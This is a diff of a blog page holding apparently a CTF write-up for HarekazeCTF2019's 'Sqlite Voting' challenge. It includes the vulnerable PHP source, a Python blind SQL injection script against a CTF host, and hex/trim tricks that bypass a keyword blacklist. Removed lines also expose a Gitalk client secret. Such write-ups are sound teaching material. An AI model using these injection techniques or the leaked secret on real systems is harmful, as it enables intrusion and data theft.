 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>])) &#123;</span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">  $banword = [</span><br><span class="line">    <span class="comment">// dangerous chars</span></span><br><span class="line">    <span class="comment">// " % ' * + / &lt; = &gt; \ _ ` ~ -</span></span><br><span class="line">    <span class="string">"[\"%'*+\\/&lt;=&gt;\\\\_`~-]"</span>,</span><br><span class="line">    <span class="comment">// whitespace chars</span></span><br><span class="line">    <span class="string">'\s'</span>,</span><br><span class="line">    <span class="comment">// dangerous functions</span></span><br><span class="line">    <span class="string">'blob'</span>, <span class="string">'load_extension'</span>, <span class="string">'char'</span>, <span class="string">'unicode'</span>,</span><br><span class="line">    <span class="string">'(in|sub)str'</span>, <span class="string">'[lr]trim'</span>, <span class="string">'like'</span>, <span class="string">'glob'</span>, <span class="string">'match'</span>, <span class="string">'regexp'</span>,</span><br><span class="line">    <span class="string">'in'</span>, <span class="string">'limit'</span>, <span class="string">'order'</span>, <span class="string">'union'</span>, <span class="string">'join'</span></span><br><span class="line">  ];</span><br><span class="line">  $regexp = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $banword) . <span class="string">'/i'</span>;</span><br><span class="line">  <span class="keyword">if</span> (preg_match($regexp, $str)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(<span class="string">"Content-Type: text/json; charset=utf-8"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// check user input</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'id'</span>]) || <span class="keyword">empty</span>($_POST[<span class="string">'id'</span>])) &#123;</span><br><span class="line">  <span class="keyword">die</span>(json_encode([<span class="string">'error'</span> =&gt; <span class="string">'You must specify vote id'</span>]));</span><br><span class="line">&#125;</span><br><span class="line">$id = $_POST[<span class="string">'id'</span>];</span><br><span class="line"><span class="keyword">if</span> (!is_valid($id)) &#123;</span><br><span class="line">  <span class="keyword">die</span>(json_encode([<span class="string">'error'</span> =&gt; <span class="string">'Vote id contains dangerous chars'</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// update database</span></span><br><span class="line">$pdo = <span class="keyword">new</span> PDO(<span class="string">'sqlite:../db/vote.db'</span>);</span><br><span class="line">$res = $pdo-&gt;query(<span class="string">"UPDATE vote SET count = count + 1 WHERE id = $&#123;id&#125;"</span>);</span><br><span class="line"><span class="keyword">if</span> ($res === <span class="keyword">false</span>) &#123;</span><br><span class="line">  <span class="keyword">die</span>(json_encode([<span class="string">'error'</span> =&gt; <span class="string">'An error occurred while updating database'</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// succeeded!</span></span><br><span class="line"><span class="keyword">echo</span> json_encode([</span><br><span class="line">  <span class="string">'message'</span> =&gt; <span class="string">'Thank you for your vote! The result will be published after the CTF finished.'</span></span><br><span class="line">]);</span><br></pre></td></tr></table></figure>
 
@@ -476,38 +263,11 @@
 <p>利用ifnull,nullif注入flag长度</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://236fd178-f35e-4f3e-88e0-70374086e68c.node3.buuoj.cn/vote.php"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get flag length</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'id'</span>:<span class="string">f'abs(ifnull(nullif(length((SELECT(flag)from(flag))),<span class="subst">&#123;i&#125;</span>),0x8000000000000000))'</span></span><br><span class="line">    &#125;</span><br><span class="line">    rep = requests.post(url,data=data)</span><br><span class="line">    print(data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'An error occurred'</span> <span class="keyword">in</span> rep.text:</span><br><span class="line">        print(<span class="string">'length: '</span>+str(i))</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./1573196707908.png" alt="1573196707908" title="">
-                </div>
-                <div class="image-caption">1573196707908</div>
-            </figure>
-
-
-
+<p><img src="./1573196707908.png" alt="1573196707908"></p>
 <p>在平常做盲注都需要字符截取进行逐位判断，但这里过滤了字符截取函数，可以使用||连接字符</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./1573198578923.png" alt="1573198578923" title="">
-                </div>
-                <div class="image-caption">1573198578923</div>
-            </figure>
-
-
-
+<p><img src="./1573198578923.png" alt="1573198578923"></p>
 <p>考虑使用replace+length替换substr，逻辑如下,需要知道flag前几个字符,在逐位猜解</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./1573198633285.png" alt="1573198633285" title="">
-                </div>
-                <div class="image-caption">1573198633285</div>
-            </figure>
-
-
-
+<p><img src="./1573198633285.png" alt="1573198633285"></p>
 <p>但是单引号双引号被过滤，还有能替换的只有hex函数，但是字符拼接0-9无需单引号，但是字符A-Z需要单双引号，可以去数据库中取</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">table = &#123;&#125;</span><br><span class="line">table[<span class="string">'A'</span>] = <span class="string">'trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)'</span> <span class="comment"># 'zebra' → '7A65627261'</span></span><br><span class="line">table[<span class="string">'C'</span>] = <span class="string">'trim(hex(typeof(.1)),12567)'</span> <span class="comment"># 'real' → '7265616C'</span></span><br><span class="line">table[<span class="string">'D'</span>] = <span class="string">'trim(hex(0xffffffffffffffff),123)'</span> <span class="comment"># 0xffffffffffffffff = -1 → '2D31'</span></span><br><span class="line">table[<span class="string">'E'</span>] = <span class="string">'trim(hex(0.1),1230)'</span> <span class="comment"># 0.1 → 302E31</span></span><br><span class="line">table[<span class="string">'F'</span>] = <span class="string">'trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)'</span> <span class="comment"># 'dog' → '646F67'</span></span><br><span class="line">table[<span class="string">'B'</span>] = <span class="string">f'trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||<span class="subst">&#123;table[<span class="string">"C"</span>]&#125;</span>||<span class="subst">&#123;table[<span class="string">"F"</span>]&#125;</span>)'</span> <span class="comment"># 'koala' → '6B6F616C61'</span></span><br></pre></td></tr></table></figure>
 
@@ -528,295 +288,137 @@
 <li>sqlite3中<code>||</code> 可以起到字符拼接的作用</li>
 </ol>
 
-        </div>
-
-        <blockquote class="post-copyright">
-    
-    <div class="content">
-        
-<span class="post-time">
-    最后更新时间：<time datetime="2020-05-15T08:22:40.000Z" itemprop="dateUpdated">2020-05-15 16:22:40</time>
-</span><br>
-
-
-        
-        玩的开心
-        
-    </div>
-    
-    <footer>
-        <a href="http://zhzhdoai.github.io">
-            <img src="/img/avatar.jpg" alt="osword">
-            osword
-        </a>
-    </footer>
-</blockquote>
-
-        
-
-
-        <div class="post-footer">
-            
-	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>
-
-
-            
-<div class="page-share-wrap">
-    
-
-<div class="page-share" id="pageShare">
-    <ul class="reset share-icons">
-      <li>
-        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://zhzhdoai.github.io/2019/11/08/HarekazeCTF2019-WEB%E9%A2%98%E8%A7%A3/&title=《HarekazeCTF2019 | WEB题解》 — osword's blog&pic=http://zhzhdoai.github.io/img/avatar.jpg" data-title="微博">
-          <i class="icon icon-weibo"></i>
-        </a>
-      </li>
-      <li>
-        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
-          <i class="icon icon-weixin"></i>
-        </a>
-      </li>
-      <li>
-        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://zhzhdoai.github.io/2019/11/08/HarekazeCTF2019-WEB%E9%A2%98%E8%A7%A3/&title=《HarekazeCTF2019 | WEB题解》 — osword's blog&source=" data-title=" QQ">
-          <i class="icon icon-qq"></i>
-        </a>
-      </li>
-      <li>
-        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://zhzhdoai.github.io/2019/11/08/HarekazeCTF2019-WEB%E9%A2%98%E8%A7%A3/" data-title=" Facebook">
-          <i class="icon icon-facebook"></i>
-        </a>
-      </li>
-      <li>
-        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《HarekazeCTF2019 | WEB题解》 — osword's blog&url=http://zhzhdoai.github.io/2019/11/08/HarekazeCTF2019-WEB%E9%A2%98%E8%A7%A3/&via=http://zhzhdoai.github.io" data-title=" Twitter">
-          <i class="icon icon-twitter"></i>
-        </a>
-      </li>
-      <li>
-        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://zhzhdoai.github.io/2019/11/08/HarekazeCTF2019-WEB%E9%A2%98%E8%A7%A3/" data-title=" Google+">
-          <i class="icon icon-google-plus"></i>
-        </a>
-      </li>
-    </ul>
- </div>
-
-
-
-    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
-        <i class="icon icon-share-alt icon-lg"></i>
-    </a>
-</div>
-
-
-
-        </div>
-    </div>
-
-    
-<nav class="post-nav flex-row flex-justify-between">
-  
-    <div class="waves-block waves-effect prev">
-      <a href="/2019/11/12/2019%E6%B9%96%E6%B9%98%E6%9D%AFweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" id="post-prev" class="post-nav-link">
-        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
-        <h4 class="title">2019湖湘杯web部分题解</h4>
-      </a>
-    </div>
-  
-
-  
-    <div class="waves-block waves-effect next">
-      <a href="/2019/11/04/%E5%AF%B9%E7%8E%B0%E4%BB%A3WEB%E6%A1%86%E6%9E%B6-CMS%E5%AE%A1%E8%AE%A1%E6%80%9D%E8%80%83/" id="post-next" class="post-nav-link">
-        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
-        <h4 class="title">对现代WEB框架/CMS审计思考</h4>
-      </a>
-    </div>
-  
-</nav>
-
-
-
-    
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<section class="comments" id="comments">
-    <div id="gitalk-container"></div>
-    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
-    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
-    <script src="/js/md5.min.js"></script>
-    <script>
-        var gitalk = new Gitalk({
-            clientID: '7d7576c71632f14d639a',
-            clientSecret: '3d7f7e4c0e9a43a2cc5334d68aee612090df8b70',
-            repo: 'zhzhdoai.github.io',
-            owner: 'zhzhdoai',
-            admin: 'zhzhdoai',
-            id: md5(location.pathname),
-            perPage: 50,
-            distractionFreeMode: 'false'
-        })
-
-        gitalk.render('gitalk-container')
-    </script>
-</section>
-
-
-
+  </div>
 </article>
 
 
 
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#encode-and-encode"><span class="toc-number">2.</span> <span class="toc-text">encode_and_encode</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easy-notes"><span class="toc-number">3.</span> <span class="toc-text">easy_notes</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HarekazeCTF2019-Avatar-Uploader-1"><span class="toc-number">4.</span> <span class="toc-text">[HarekazeCTF2019]Avatar Uploader 1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HarekazeCTF2019-Avatar-Uploader-2"><span class="toc-number">5.</span> <span class="toc-text">[HarekazeCTF2019]Avatar Uploader 2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#利用"><span class="toc-number">5.1.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Sqlite-Voting"><span class="toc-number">6.</span> <span class="toc-text">Sqlite Voting</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#利用-1"><span class="toc-number">6.1.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#总结"><span class="toc-number">7.</span> <span class="toc-text">总结</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zhzhdoai.github.io/2019/11/08/HarekazeCTF2019-WEB%E9%A2%98%E8%A7%A3/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://zhzhdoai.github.io/2019/11/08/HarekazeCTF2019-WEB%E9%A2%98%E8%A7%A3/&text=HarekazeCTF2019 | WEB题解" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zhzhdoai.github.io/2019/11/08/HarekazeCTF2019-WEB%E9%A2%98%E8%A7%A3/&title=HarekazeCTF2019 | WEB题解" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zhzhdoai.github.io/2019/11/08/HarekazeCTF2019-WEB%E9%A2%98%E8%A7%A3/&is_video=false&description=HarekazeCTF2019 | WEB题解" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HarekazeCTF2019 | WEB题解&body=Check out this article: http://zhzhdoai.github.io/2019/11/08/HarekazeCTF2019-WEB%E9%A2%98%E8%A7%A3/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://zhzhdoai.github.io/2019/11/08/HarekazeCTF2019-WEB%E9%A2%98%E8%A7%A3/&title=HarekazeCTF2019 | WEB题解" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://zhzhdoai.github.io/2019/11/08/HarekazeCTF2019-WEB%E9%A2%98%E8%A7%A3/&title=HarekazeCTF2019 | WEB题解" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zhzhdoai.github.io/2019/11/08/HarekazeCTF2019-WEB%E9%A2%98%E8%A7%A3/&title=HarekazeCTF2019 | WEB题解" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://zhzhdoai.github.io/2019/11/08/HarekazeCTF2019-WEB%E9%A2%98%E8%A7%A3/&title=HarekazeCTF2019 | WEB题解" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zhzhdoai.github.io/2019/11/08/HarekazeCTF2019-WEB%E9%A2%98%E8%A7%A3/&name=HarekazeCTF2019 | WEB题解&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://zhzhdoai.github.io/2019/11/08/HarekazeCTF2019-WEB%E9%A2%98%E8%A7%A3/&t=HarekazeCTF2019 | WEB题解" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
 </div>
 
-        <footer class="footer">
-    <div class="top">
         
-<p>
-    <span id="busuanzi_container_site_uv" style='display:none'>
-        站点总访客数：<span id="busuanzi_value_site_uv"></span>
-    </span>
-    <span id="busuanzi_container_site_pv" style='display:none'>
-        站点总访问量：<span id="busuanzi_value_site_pv"></span>
-    </span>
-</p>
-
-
-        <p>
-            
-                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
-            
-            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
-        </p>
-    </div>
-    <div class="bottom">
-        <p><span>osword &copy; 2015 - 2020</span>
-            <span>
-                
-                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
-            </span>
-        </p>
-    </div>
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2020
+    osword
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </nav>
+  </div>
 </footer>
 
-    </main>
-    <div class="mask" id="mask"></div>
-<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
 
 
-
-<div class="global-share" id="globalShare">
-    <ul class="reset share-icons">
-      <li>
-        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://zhzhdoai.github.io/2019/11/08/HarekazeCTF2019-WEB%E9%A2%98%E8%A7%A3/&title=《HarekazeCTF2019 | WEB题解》 — osword's blog&pic=http://zhzhdoai.github.io/img/avatar.jpg" data-title="微博">
-          <i class="icon icon-weibo"></i>
-        </a>
-      </li>
-      <li>
-        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
-          <i class="icon icon-weixin"></i>
-        </a>
-      </li>
-      <li>
-        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://zhzhdoai.github.io/2019/11/08/HarekazeCTF2019-WEB%E9%A2%98%E8%A7%A3/&title=《HarekazeCTF2019 | WEB题解》 — osword's blog&source=" data-title=" QQ">
-          <i class="icon icon-qq"></i>
-        </a>
-      </li>
-      <li>
-        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://zhzhdoai.github.io/2019/11/08/HarekazeCTF2019-WEB%E9%A2%98%E8%A7%A3/" data-title=" Facebook">
-          <i class="icon icon-facebook"></i>
-        </a>
-      </li>
-      <li>
-        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《HarekazeCTF2019 | WEB题解》 — osword's blog&url=http://zhzhdoai.github.io/2019/11/08/HarekazeCTF2019-WEB%E9%A2%98%E8%A7%A3/&via=http://zhzhdoai.github.io" data-title=" Twitter">
-          <i class="icon icon-twitter"></i>
-        </a>
-      </li>
-      <li>
-        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://zhzhdoai.github.io/2019/11/08/HarekazeCTF2019-WEB%E9%A2%98%E8%A7%A3/" data-title=" Google+">
-          <i class="icon icon-google-plus"></i>
-        </a>
-      </li>
-    </ul>
- </div>
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
 
 
-<div class="page-modal wx-share" id="wxShare">
-    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
-    <p>扫一扫，分享到微信</p>
-    <img src="//api.qrserver.com/v1/create-qr-code/?data=http://zhzhdoai.github.io/2019/11/08/HarekazeCTF2019-WEB%E9%A2%98%E8%A7%A3/" alt="微信分享二维码">
-</div>
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
 
 
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
 
+<!-- clipboard -->
 
-    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
-<script>
-var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
 
-
-</script>
-
-<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
-
-
-<div class="search-panel" id="search-panel">
-    <ul class="search-result" id="search-result"></ul>
-</div>
-<template id="search-tpl">
-<li class="item">
-    <a href="{path}" class="waves-block waves-effect">
-        <div class="title ellipsis" title="{title}">{title}</div>
-        <div class="flex-row flex-middle">
-            <div class="tags ellipsis">
-                {tags}
-            </div>
-            <time class="flex-col time">{date}</time>
-        </div>
-    </a>
-</li>
-</template>
-
-<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
-
-
-
-
-
-
-<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-
-
-
-<script>
-(function() {
-    var OriginTitile = document.title, titleTime;
-    document.addEventListener('visibilitychange', function() {
-        if (document.hidden) {
-            document.title = '死鬼去哪里了！';
-            clearTimeout(titleTime);
-        } else {
-            document.title = '(つェ⊂)咦!又好了!';
-            titleTime = setTimeout(function() {
-                document.title = OriginTitile;
-            },2000);
-        }
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
     });
-})();
-</script>
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
 
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
 
 
 </body>
